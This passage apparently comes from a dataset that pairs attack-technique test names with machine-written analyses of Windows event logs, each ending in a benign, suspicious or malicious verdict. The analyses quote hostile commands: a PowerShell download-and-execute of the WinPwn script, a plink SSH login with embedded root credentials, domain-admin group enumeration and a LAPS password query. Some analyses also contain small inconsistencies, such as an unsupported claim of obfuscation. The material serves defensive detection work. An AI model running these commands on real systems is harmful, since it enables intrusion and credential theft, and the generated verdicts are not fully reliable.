  - Consider conducting a review of user access and privileged account activity to identify potential misuse or exposure.
  - Validate that all systems have up-to-date security patches and that security policies adequately enforce least privilege.

Further investigation and context around these activities are vital to determine if there is indeed a security compromise or if the actions are benign under specific operational tasks."
Security Software Discovery - Windows Defender Enumeration,"In analyzing the provided Windows event logs, the following points can be observed:

### PowerShell Logs:
- The PowerShell events capture execution of commands typically used to check the status of Windows Defender and current security posture (`Get-Service WinDefend`, `Get-MpComputerStatus`, `Get-MpThreat`). While these actions are often part of legitimate administrative tasks or security assessments, they could also be utilized by an attacker to analyze the security posture of the system to disable or bypass defenses.

### System Logs:
- There are time changes recorded in the logs (`EventID: 1 - Kernel-General`) where the system time was adjusted backwards, which can be a tactic employed by attackers to manipulate log times and potentially cover tracks. However, the process responsible (`svchost.exe`) is a legitimate Windows process. This event might be linked to normal system activity, but the context of its occurrence is crucial.

### Security Logs:
- Security events show time changes that correspond to those recorded in the system logs. Adjustments in time are reflected in these logs, matching the forward and reversed time stamps. Again, such activity can be benign or an indicator of an attempt to obscure malicious actions.

### Sysmon Logs:
- Several processes associated with standard tools and services such as `whoami.exe`, `conhost.exe`, and `MicrosoftEdgeUpdate.exe` are recorded. These activities include verifying user account details and updating Microsoft Edge, which are typically benign.
- There is a distinct presence of processes performing updates (`MicrosoftEdgeUpdate.exe`). While Edge updating processes are usual, they generate numerous associated process activities which could be suspicious if unexpected, but no anomaly is detected from these activities alone.

### Application Logs:
- Entries related to `edgeupdate` indicate service stops, which is compatible with the updating actions seen in the Sysmon logs. This could be normal behavior for stopping a service momentarily during an update process.

### Conclusion:
Upon evaluating the logs, the majority of the activities recorded align with legitimate system administration and software update tasks. The presence of PowerShell commands checking system defenses could be interpreted as a routine security check, but without additional context, such behavior could also warrant closer examination due to potential misuse.

### Resolution:
Given the information and typical processes recorded, the resolution is: 

- **SUSPICIOUS** - The existence of PowerShell activity checking security defenses and system time changes can both indicate routine tasks or preparatory steps for malicious activity. Further investigation is warranted to rule out any malicious intent, especially focusing on the origin of the PowerShell commands and justification for altering system time. A continuous review of further logs is recommended for ongoing insights into system behavior."
Basic Permission Groups Discovery Windows (Domain),"Upon analyzing the Windows event logs provided, several observations can be made regarding potential indicators of malicious activity. 

**Observations:**

1. **Frequent Usage of Windows Utilities:**
    - Multiple instances of the `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` processes are executed in rapid succession by the user `SERVER002\admin_test`. These utilities are standard in Windows environments but can also be used for information gathering or administrative tasks.
    
2. **Command Execution:**
   - The execution of `cmd.exe` with specific command-line arguments is noted:
     ```plaintext
     ""cmd.exe"" /c net localgroup & net group /domain & net group ""enterprise admins"" /domain & net group ""domain admins"" /domain
     ```
   - This command checks group memberships, including privileged groups like ""enterprise admins"" and ""domain admins,"" which could suggest reconnaissance efforts typically related to an attack.

3. **Integrity Level and Hashes:**
   - Executed processes such as `cmd.exe`, `net.exe`, and `net1.exe` run with a High Integrity Level, indicating administrative privileges.
   - SHA256 hashes seem standard and not inherently suspect unless known malicious signatures.

4. **Time Synchronization Events:**
   - There are several events indicating a change in system time, synchronized with `time.windows.com`, which is typical behavior for time synchronization and not inherently suspicious.

5. **User Accounts:**
   - All operations appear to be carried out by the user `SERVER002\admin_test` with elevated privileges.

**Assessment:**
- **Reconnaissance Activity:** The command execution involving various `net` commands suggests potential reconnaissance activity aimed at identifying membership in privileged groups. This aligns with techniques often used in the discovery phase of malicious operations.

- **Absence of Direct Malicious Actions:** While the reconnaissance behavior is suspicious, there is no direct evidence of further stages of an attack, such as privilege escalation or lateral movement.

**Resolution:**
- **SUSPICIOUS:** The logs contain activities that do not appear to align with routine administrative tasks, especially the enumerations of privileged group memberships, and warrant further investigation. It's recommended to:
  - Review account activities for `SERVER002\admin_test` to determine if these actions were legitimate.
  - Verify if similar activity has been recorded in network or other system logs.
  - Implement tighter monitoring on privileged user activities and utilize more detailed auditing to capture additional context if these events recur."
ESXi - Enumerate VMDKs available on an ESXi Host,"### Detailed Analysis of Logs

**Observations:**

1. **PowerShell Execution:**
   - There is an event log indicating the execution of `powershell.exe` by user `SERVER002\admin_test` on `2024-10-23 19:09:11`. This is generally normal but could be leveraged in attacks if executing suspicious scripts or commands.

2. **Wevtutil and Conhost Usage:**
   - `wevtutil.exe` and `conhost.exe` are executed multiple times in rapid succession by the `admin_test` account. The `wevtutil` utility is used to manage Windows event logs and is not a typical command run frequently unless logs are being cleared or altered intentionally.
   - Frequent `conhost.exe` activity is often associated with command-line operations. The context of these executions hints at potential staging or probing operations.

3. **Command-line executions with sensitive actions:**
   - A `cmd.exe` process spawned with command line arguments indicating SSH attempts using `plink.exe`, which is part of the PuTTY suite, was observed. This indicates an attempt to establish a connection, possibly unauthorized, to a machine identified as `file.local` with the `root` user and password `pass`.
   - It's noteworthy that the password is insecurely included in the command line, suggesting either a misconfiguration or an attacker’s activity trying to automate access.

4. **Whoami and hostname executions:**
   - Frequent executions of `whoami.exe` and `hostname.exe` are observed. These commands are often used to gather local information, which might be benign unless tied to automated scripts used by attackers to collect system information.

5. **Edge Update Activity:**
   - A number of executions related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) were noted, attributed to `NT AUTHORITY\SYSTEM`. This is typical for system updates unless combined with unexpected behaviors, which doesn't appear evident in this set of logs.

**Indicators of Compromise:**

- **Malicious Activity Detected:**
  - The execution of `plink.exe` with embedded credentials makes this a highly suspicious activity and aligns with compromised behavior aiming at lateral movement or remote system access. The account `root` and plaintext password usage have characteristics of potential unauthorized remote access attempts.
  
- **Wevtutil and conhost Execution Pattern:**
  - While not overtly malicious on their own, the combination of `wevtutil.exe` events managed by the `admin_test` account, along with `conhost.exe`, could suggest log tampering to conceal activities, often a hallmark of malicious actors after completing a staged task.

### Assessment and Recommendation:
- **Resolution: MALICIOUS**
  - Given the evidence of SSH attempts with password exposure using `plink.exe` and potential event log manipulation attempts, the key activities detected herein are indicative of malicious intent.

**Next Steps:**
1. **Immediate Containment:**
   - Disable or reset credentials for `SERVER002\admin_test` to prevent further unauthorized access or activities.
   - Investigate and restrict any network activity from Server002 related to `file.local`.
  
2. **System Review:**
   - Conduct a thorough forensic analysis of Server002 to ascertain what data or further systems may have been affected.
   - Review PowerShell logs and further wevtutil commands (if available) to identify additional malicious scripts.

3. **Long-term Measures:**
   - Implement logging and alerting for command-line tools usage, especially where sensitive operations could expose critical data or network paths.
   - Conduct a security audit of SSH daemons and associated configurations, ensuring the use of strong password policies and multi-factor authentication where necessary."
WinPwn - spoolvulnscan,"Upon analyzing the provided logs, the following observations can be made:

### Suspicious or Anomalous Behavior:
1. **Repetitive Execution of `wevtutil.exe` and `conhost.exe`:**
   - Several instances show the execution of `wevtutil.exe` and `conhost.exe` in rapid succession. While these are legitimate system utilities, the repetitive nature without accompanying context such as log collection or maintenance tasks could indicate either a script execution or potential misuse.

2. **Command-Line Execution with Suspicious PowerShell Activity:**
   - An event logged for `powershell.exe` shows a command line with a URL pointing to a GitHub repository from which a script is being downloaded and executed in memory (`iex(new-object net.webclient).downloadstring(...)`). This is a common technique used for executing scripts without writing them to disk, potentially indicating malicious intent.
   - The script being referred to is “WinPwn.ps1” from a repository named “S3cur3Th1sSh1t”. The name itself, combined with the method of execution, strongly suggests that it is likely a penetration testing tool or malicious script designed to exploit vulnerabilities.

3. **Time Manipulation Event:**
   - Security logs indicate changes in the system time (`EventID 4616` related to `svchost.exe`). Although such events can be legitimate, they can potentially be indicative of attempts to tamper with log file timestamps to cover tracks of malicious activities.

4. **High Integrity Level for Scripts:**
   - The invocation of `powershell.exe` as observed is running with high integrity level, which means it potentially has administrative privileges. Running external scripts over PowerShell with such privileges could pose significant security risks, especially if the script is not a known safe utility.

### Assessment of Potential Malicious Activity:
- The most concerning element in these logs is the downloading and execution of a script directly from an external source over PowerShell. Given it uses `iex (Invoke-Expression)`, it indicates that the script is executed immediately upon download without any intermediary checks. This is considered risky behavior, typically associated with malicious intentions.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Block the URL `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn` at the network level to prevent potential attempts to download and execute the script further.
   - Temporarily restrict the affected user account (`SERVER002\\admin_test`) until further verification can be completed.
   - Conduct a comprehensive scan for malware or unauthorized software focusing particularly on the machine `Server002`.

2. **Further Investigation:**
   - Assess the contents of the downloaded script if possible to determine the specific impact and potential exploits it might utilize.
   - Cross-reference with known threat intelligence databases to see if the script or source website has been flagged previously for malicious activity.
   - Review network logs for any unusual outbound or inbound traffic patterns that might correlate with times of noted suspicious activity.

3. **Remediation Recommendations:**
   - Implement stricter egress filtering policies to block unauthorized internet-bound traffic.
   - Review and enforce PowerShell execution policies and logging for all systems to prevent the execution of scripts from unknown or untrusted locations.
   - Educate users and administrators on identifying phishing techniques or social engineering tactics which may lead to the execution of such scripts.

### Final Resolution:
Given the evidence from the logs, this situation is deemed **MALICIOUS** given the direct execution of a potentially harmful script through PowerShell which reflects a significant security threat. Immediate remediation actions are advised to mitigate risks and prevent further exposure."
Enumerate COM Objects in Registry with Powershell,"Upon analyzing the provided logs from the Windows host, I've identified a mix of expected system behaviors and some unusual activities that warrant further investigation. Let’s walk through the notable entries and extrapolate their implications.

   - **DCOM Error (EventID 10010):** A DCOM event found may indicate potential configuration issues but not necessarily malicious behavior unless correlated to a specific attack or exploit attempt.

2. **Security Logs:**
   - **Logon Events (EventID 4624, 4672):** Successive logon events recorded for `SYSTEM` and `admin_test`, both showing high-level privileges. The `admin_test` account appears to log in using NTLM from a possibly unrelated workstation. While NTLM logins are common, they can be abused in attack scenarios (e.g., pass-the-hash or lateral movement), especially when privileges like `SeDebugPrivilege` are present.

3. **Windows PowerShell Logs:**
   - **PowerShell Activity (EventID 600):** Execution of scripts via PowerShell indicating potential reconnaissance or enumeration activity on the system. The creation of a new PSDrive to access registry keys suggests a deeper look at potential exploitation or setup of persistence mechanisms. This could be part of a legitimate administrative task or a precursor to more sinister actions.

4. **Sysmon Logs:**
   - **wevtutil.exe and conhost.exe Observations (EventID 5):** Related to the event log utilities which may hint at event log manipulation or auditing actions by the `admin_test` user.
   - **Process Creation:** 
     - **whoami.exe, hostname.exe Activities:** Typically used for information gathering about logged users and network name. These could be benign but, if unsanctioned, can demonstrate an understanding or analysis of the environment.
     - **Potential Update or Installations:** Several installers and update clients (for example, Microsoft Edge) were executed. While legitimate software often performs these actions, it is crucial to verify the signing of these executables to confirm their authenticity and check for known vulnerabilities.

5. **Uncommon Hosts and Services:**
   - **FileCoAuth.exe and ielowutil.exe:** The logging of processes related to OneDrive and Internet Explorer is routine unless combined with unusual command lines or network connections, which require attention.

### Assessment:
The logs reveal a mix of typical and atypical behaviors:
- **BENIGN:** Majority of Windows Update and expected process executions indicate regular system operations.
- **SUSPICIOUS:** PowerShell activities related to registry enumeration and the involvement of an admin account in accessing system tools like `wevtutil.exe` suggest possible misuse or preliminary reconnaissance.

### Recommended Action:
Given the uncertainties around the `admin_test` account activities and PowerShell usage, conduct further investigation into:
- The legitimacy and recent changes associated with the `admin_test` account.
- Whether PowerShell scripts correspond to any internal configuration changes or align with a standard operational task.
- Verify and corroborate NTLM authorization actions to rule out credential compromise.
- Review network logs and protocol usage to exclude data exfiltration or unwanted lateral movement.

**Resolution:** SUSPICIOUS

While there is no immediate evidence of confirmed malicious intent based solely on these logs, the flagged actions merit additional scrutiny to ensure network integrity and rule out an impending threat."

Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property,"Upon reviewing the provided logs, we observe the following key activities across the System, Security, Windows PowerShell, Sysmon, and Application logs:

### System Log:
- The logs show ""Microsoft-Windows-Kernel-General"" events concerning time changes. This generally indicates that the system time was adjusted, which could be normal behavior or an indication of manipulation, depending on the context (e.g., NTP synchronization).

### Security Log:
- Security Event ID 4616: This event indicates a change in system time, performed by the process `svchost.exe`, executed by a service with the LOCAL SERVICE account. Frequent or unexpected changes in system time can indicate malicious activity; however, these do not show any signs of privilege misuse or escalation.

### Windows PowerShell Log:
- The PowerShell logs indicate the execution of a PowerShell command, specifically: `Get-ADComputer $env:computername -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime`. This command is used to retrieve attribute properties related to the Local Administrator password management, which is commonplace in environments using LAPS (Local Administrator Password Solution). While this could be benign in certain admin contexts, unauthorized usage of such commands can be risky.

### Sysmon Log:
- Sysmon events show multiple executions of processes like `wevtutil.exe` and `conhost.exe`, as well as `whoami.exe` and PowerShell activity, by a user `SERVER002\\admin_test` with a high integrity level. 
- The prevalence of processes related to Microsoft Edge Update suggests software updates were occurring. This includes processes such as `MicrosoftEdgeUpdate.exe` and related components.
- Although there are many legitimate processes, ensuring these updates are verified and expected is crucial as they run with significant system privileges.

### Application Log:
- Two events correspond with the stopping of the Edge Update services. The stoppage of services itself isn't inherently suspicious unless paired with unusual system or application behavior.

### Assessment:
- **Suspicious Activity**: The logs contain activities like frequent system time changes, execution of administrative PowerShell commands potentially related to sensitive information retrieval (LAPS-related), and various system operations conducted under elevated privileges. While these activities could be part of normal maintenance or operations, they warrant closer inspection to ensure authorized and expected usage.

### Recommendation:
1. **Verify Time Changes**: Ensure the time adjustments align with expected maintenance or synchronization practices. Investigate if there were any deviations that could signify tampering.
2. **PowerShell Command Review**: Confirm if the PowerShell command executed to retrieve LAPS attributes was performed by authorized personnel/applications.
3. **Software Update Validity**: Cross-check Microsoft Edge Update activities and ensure they are legitimate, expected, and haven’t been tampered with.
4. **User Activities Audit**: Conduct a review on `SERVER002\\admin_test` activities during that timeframe, ensuring all operations were authorized and legitimate.

Examine domain password policy - Windows,"Upon reviewing the provided Windows event logs, I have compiled the following analysis:

### System Log Analysis:
- The logs contain entries related to time synchronization (`EventID 1`) managed by `svchost.exe`, which is behaving normally as time adjustments can occur typically due to network time synchronizations.
- No indicators of suspicious behavior such as unexpected process launches or privilege changes are visible in the System log.

### Application Log Analysis:
- An entry related to the Microsoft-Windows-Security-SPP (`EventID 16384`) indicates the operation of the Software Protection Platform Service, which is a typical background operation and not necessarily suspicious.

### Security Log Analysis:
- There are multiple successful logon events (`EventID 4624`) using NTLM authentication, indicating a potentially regular network logon.
- EventID 4634 indicates a logoff event of `admin_test` which is a normal activity.
- Privileged logon detection (`EventID 4672`) for user `admin_test` with extensive privileges is noted. This includes `SeDebugPrivilege` and other critical rights. While the presence of such privileges is normal for an administrative account, any unexpected or unauthorized access using this account must be reported and analyzed further.
- EventID 4616 shows time change audits which correlate with the System log entries and do not have indicators of malicious intent.

### Sysmon Log Analysis:
- Multiple instances of `conhost.exe`, `whoami.exe`, and `cmd.exe` execution appear and are typically harmless in isolation. However, their frequent appearance in conjunction can suggest investigation context, such as user enumeration or system profiling, which is often benign but can be part of attack reconnaissance or post-exploitation.
- The execution of `wevtutil.exe`, a tool used to manage event logs, is notable. Its use by the `admin_test` account should be checked against expected administrative usage to rule out potential attempts to alter log data.
- The command-line activity is within normal parameters, primarily diagnostics or status-check related.
- The issuing of `net.exe` and `net1.exe` with `accounts /domain` by `admin_test` indicates enumeration of domain accounts, which could be normal for administrative tasks or a part of reconnaissance efforts during lateral movement.

### Conclusion:
The logs do not unequivocally confirm malicious activity but present certain suspicious indicators such as extensive privilege use by `admin_test`, execution of `wevtutil.exe`, and network credential enumeration using `net`. While these could stem from regular administrative tasks, they warrant closer scrutiny to ensure they align with expected behaviors.

### Resolution:
**SUSPICIOUS** - Further investigation is needed to verify the context of administrative actions taken by the `admin_test` account. Activities such as enumeration of network accounts and handling of elevated privileges should be validated with current operational tasks to confirm legitimacy. Additional monitoring or alerting on this account's activity may be advisable to preempt misuse."

"
Process Discovery - PC Hunter,"Based on the analysis of the provided Windows event logs, several indicators suggest potentially suspicious activity. Here’s a detailed breakdown of the findings:

1. **Privileged Logon Events**:
   - Event ID 4672 indicates that the user `admin_test` was assigned special privileges indicative of a high-privileged account. These privileges include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others, which can be sensitive if not properly managed.

2. **Logon and Logoff Activities**:
   - Multiple logon (Event ID 4624 with LogonType 3, suggesting network logon) and logoff (Event ID 4634) events were recorded for the `admin_test` user within a short time frame. The network logons using NTLM from the workstation `DESKTOP-3HL5B2P` and the presence of this activity in close time proximity can be normal behavior depending on network configurations; however, they are worth investigating further, particularly due to the plethora of privileges.

3. **PowerShell Activity**:
   - The powershell.exe process was used to execute `PCHunter64.exe`, located in a temporary directory. PCHunter is often used as a legitimate tool for in-depth system inspection; however, its execution via PowerShell, especially when initiated by a privileged user without corresponding administrative justification, is suspect and could indicate an attempt at stealthy administration or reconnaissance.

4. **System Processes**:
   - The service installation log (Event ID 7045) for `MpKsl71eecf46`, a kernel mode driver for Windows Defender, doesn't appear malicious on its own, but always worth confirming its legitimacy in context with other suspicious activities.

5. **Sysmon Process Execution**:
   - The execution of `powerhsell.exe` and `PCHunter64.exe` is logged by Sysmon, reinforcing the suspicious PowerShell activity. The close temporal correlation between these processes might indicate an unauthorized or undisciplined administrative action.
   - The execution of utilities like `HOSTNAME.EXE` and `whoami.exe` can be benign but, if repeatedly occurring in combination with elevated privileges, might indicate reconnaissance activity consistent with adversary simulations.

6. **Certificate Logging**:
   - The evidence of certificates verification via CAPI2 logs doesn't directly suggest suspicious activity but can be part of benign system activities.

7. **Non-suspicious Elements**:
   - Several services and system process executions were logged, such as `wevtutil.exe` and `WMIADAP.exe`, all of which appear benign in this context, assuming they match typical operational behavior and timing.

**Assessment**:
Given the combination of highly privileged logons, obfuscated PowerShell usage, and execution of potentially dual-use tools like `PCHunter64.exe`, this activity is marked as **SUSPICIOUS**. 

**Resolution**: 
- **SUSPICIOUS**. Further investigation is warranted.
  - Verify the legitimacy of `PCHunter64.exe` and its intended use.
  - Correlate IP activity and workstation `DESKTOP-3HL5B2P` with user actions to validate if this usage aligns with expected operations.
  - Conduct interviews or check logs for corresponding administrator actions or service requests for those periods.
  - Review system configurations and policies regarding the use of scripts/tools like PowerShell for administration, especially involving external tools."
Discover System Language with chcp,"Upon reviewing the provided Windows event logs, here is the analysis:

### Notable Observations:

1. **Process Executions**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` in quick succession.
   - Execution of `hostname.exe`, `whoami.exe`, and `cmd.exe` with no apparent unusual arguments.
   - These processes (`wevtutil.exe`, `conhost.exe`, etc.) are legitimate Windows processes used in normal administrative activities, such as managing event logs and command-line interfaces.

2. **Security Events**:
   - There were multiple logon events for the user account `admin_test` using NTLM authentication.
   - The privileges associated with this account included powerful permissions such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, and others typical for an administrative account.

3. **Time Changes**:
   - The system time was adjusted back slightly (from 16:20:55 to 16:20:49). This could be a system's time synchronization activity with time.windows.com.  

4. **Services Activities**:
   - Processes such as `svchost.exe`, `sppsvc.exe`, `TiWorker.exe`, and `TrustedInstaller.exe` were running under system accounts or network service accounts, which again are typical for Windows system processes managing internal maintenance and updates.

### Assessment:

- **Repeated Executions**: While the Sysmon logs show repeated executions of processes like `wevtutil.exe` and `conhost.exe`, these do not inherently indicate malicious behavior without context of unusual arguments or unexpected users.
  
- **Command Line Tools**: Tools like `whoami.exe` and `cmd.exe` are often used for adding environmental controls, which might be benign but demand scrutiny if seen frequently and without proper documentation.

- **Administrative Privileges**: The presence of high-level privileges under the user `admin_test` could allow for significant changes to be made on the system. However, without evidence of misused privileges, this remains within the scope of normal administrative capabilities.

- **Time Change Event**: The time change aligns with a typical system time service operation and doesn't suggest tampering.

### Threat Determination:

- **BENIGN**: Given the data in the logs, there are no strong indicators of compromise or malicious activity. The process executions and logon events appear to correlate with legitimate system operations, potentially linked to standard administrative tasks being carried out by the user `admin_test`.

### Recommendation:

- **Monitoring**: Continue monitoring for any anomalous behavior or unusual account usage outside normal working hours or unexpected accounts accessing sensitive information.
- **Documentation**: Ensure that all administrative activities are documented, and correlate any such logon events with proper IT workflow records.
- **Alert Thresholds**: Set alert thresholds for uncommon processes being executed by users without appropriate roles and regularly review privileged access controls.

Overall, while vigilance is necessary, the current logs reflect typical administrative actions and maintenance tasks rather than malicious conduct."
Process Discovery - wmic process,"### Analysis of Provided Windows Event Logs

#### Application Log Analysis
- **EventID 16384 - Software Protection Platform Service**:
  - This is a normal operational event from the Software Protection Platform Service and does not indicate any malicious activity. It provides information about a task involving the RulesEngine.

#### Security Log Analysis
- **EventID 4616 - System Time Change**:
  - Two incidents of time being set backward are recorded. The `NewTime` is earlier than the `PreviousTime`. This behavior might be legitimate, related to system time synchronization, or could be malicious if an attacker is attempting to evade detection by altering timestamps.
  - Both incidents are executed by `svchost.exe`, a legitimate Windows process often targeted in various attacks. Given the context provided, there’s no added factor indicating illicit intent from just the time modification.

#### Sysmon Log Analysis
- **Multiple Process Creations (EventID 5 and EventID 1)**:
  - **Processes like `wevtutil.exe` and `conhost.exe`:** These are built-in Windows utility tools and console hosts, respectively. Their execution might raise suspicion if found in unusual sequences or under unexpected user accounts.
  - **Occurrence of `hostname.exe`, `whoami.exe`, `cmd.exe`, and `WMIC.exe`:** While these executables access system information, they are often used in reconnaissance or system surveying activities. However, they do not inherently indicate malicious behavior unless accompanied by more direct indicators of compromise.
  - **`User: SERVER002\\admin_test`** is repeatedly mentioned, suggesting these system tools are being executed under an admin context intentionally, which could be normal for administrator action or batch execution.
  - **High Integrity Levels:** These can occur under admin execution context and aren't singularly suspicious.
  
### Assessment
- **Suspicious**:
  - The numerous executions of system binaries like `wmic.exe` and `cmd.exe`, especially under a specific admin account, could suggest unusual activity worth investigating further—especially if not aligning with known administrative activities or automation processes.
  - Time change events can be pertinent, especially if combined with log tampering or other forms of clock manipulation, yet no immediate evidence of it appears.

### Recommendation and Resolution
- **Resolution: SUSPICIOUS**
  - **Further Investigation Needed**: 
    - Examine the historical behavior of `SERVER002\\admin_test` to understand if these operations align with the user’s regular activities or scheduled tasks.
    - Review any recent administrative tasks executed on `Server002` that could explain these logs.
    - Check for any unauthorized access or shadow accounts leveraging administrative privileges.
    - Verify the synchronization settings and source for time service to ensure it’s aligned with enterprise policy and expected network behavior.
    - Monitor for log concatenation or suppression attempts that could correlate with manual log clearing efforts.
    - Implement additional logging or alerts on `Server002` to catch any further questionable administrative or system-level activities. 

Given the logs, caution is advised, and diligent step-by-step verification of the above elements should provide a clearer context and understanding of the network or host condition."
